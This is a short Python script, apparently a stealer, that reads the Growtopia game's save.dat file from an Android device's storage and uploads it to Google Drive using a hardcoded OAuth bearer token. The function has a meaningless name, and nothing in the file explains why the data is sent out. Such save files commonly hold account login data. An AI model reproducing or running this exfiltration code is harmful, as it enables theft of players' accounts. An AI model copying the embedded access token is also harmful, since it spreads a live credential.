import json
import requests
def fucxy():
    headers = {"Authorization": "Bearer ya29.a0AfH6SMBDlwPOe_v_qu7WZNLvz3qBULblOX58hL5A0-LOvAwEZLdmSHp8pHOJzz7GigswpyyTkmGSABPIC6rm-LV5n5UXnesGH4U_ow9eCQk5nxMpXk4eVVAm-vO2VtgV-y9bOcbYhIQtoOOYq1TKGdyqMNID"}
    para = {
        "name": "saved.dat",
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )


